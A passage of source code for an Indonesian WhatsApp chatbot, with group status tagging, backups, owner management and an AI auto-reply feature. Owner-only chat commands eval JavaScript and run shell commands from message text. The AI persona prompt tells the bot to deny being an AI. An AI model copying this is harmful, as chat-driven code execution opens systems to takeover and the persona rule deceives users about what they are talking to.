    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await XPanz.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await XPanz.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await XPanz.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: XPanz.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await XPanz.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return ArroganzzReply(`Berhasil membuat status tag grup ${nama}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return ArroganzzReply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await ArroganzzReply("Memproses backup script bot")
var name = `ArroganzzBotz-Backup`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await XPanz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return ArroganzzReply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return ArroganzzReply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
ArroganzzReply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setppbot": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (/image/g.test(mime)) {
var medis = await XPanz.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await XPanz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
ArroganzzReply("Berhasil mengganti foto profil bot ✅")
} else {
await XPanz.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
ArroganzzReply("Berhasil mengganti foto profil bot ✅")
}
} else return ArroganzzReply(example('dengan mengirim foto'))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return ArroganzzReply(mess.owner)
XPanz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return ArroganzzReply("Tidak ada owner tambahan")
let teks = ` *── List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
XPanz.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.quoted && !text) return ArroganzzReply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return ArroganzzReply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return ArroganzzReply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
ArroganzzReply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.quoted && !text) return ArroganzzReply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return ArroganzzReply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
ArroganzzReply(`Berhasil menambah owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ArroganzzReply(evaled)
} catch (err) {
await ArroganzzReply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
ArroganzzReply("Online ✅")
}

if (m.text.toLowerCase() == "Assalamualaikum") {
ArroganzzReply("Waalaikumsalam Bg")
}

if (globalAutoAIStatus) {
    if (m.isBaileys && m.fromMe) return;
  
    const ignoredPrefixes = ['.', '#', '!', '/', '\\/'];
    if (ignoredPrefixes.some(prefix => m.text.startsWith(prefix))) return;
    if (!m.text) return;

    const chatId = m.chat;
    if (!sessions[chatId]) {
        sessions[chatId] = { messages: [] };
    }
    const d = new Date();
    d.setTime(d.getTime() + 3600000);
    const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' });
    const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss');
    const namePengguna = XPanz.getName(m.sender);

    const prompt = `
    Halo ${namePengguna} 👋, perkenalkan nama saya Arroganzz Botz. Namamu pasti ${namePengguna}, bukan? ✨ Hari ini adalah ${hariini}, pukul ${jam} waktu WIB. Nama kamu adalah Arroganzz, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu. 📌 *Aturan Main Biyu:* - Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol. - Gunakan bahasa yang santai, tapi tetap sopan. - Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol. - Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!". Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan! 
    `;

    sessions[chatId].messages.push({ user: m.text });
    saveSession();

    try {
        const requestData = { 
            content: m.text, 
            user: m.sender, 
            prompt 
        };
        
        const axios = require('axios');
        const response = await axios.post('https://luminai.my.id', requestData);
        
        sessions[chatId].messages.push({ bot: response.data.result });
        saveSession();
        
        return XPanz.sendMessage(m.chat, { text: response.data.result }, { quoted: m });
    } catch (err) {
        console.error(err);
        return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
    }
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ArroganzzReply(evaled)
} catch (err) {
await ArroganzzReply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return ArroganzzReply(`${err}`)
if (stdout) return ArroganzzReply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
XPanz.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error :*\n
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});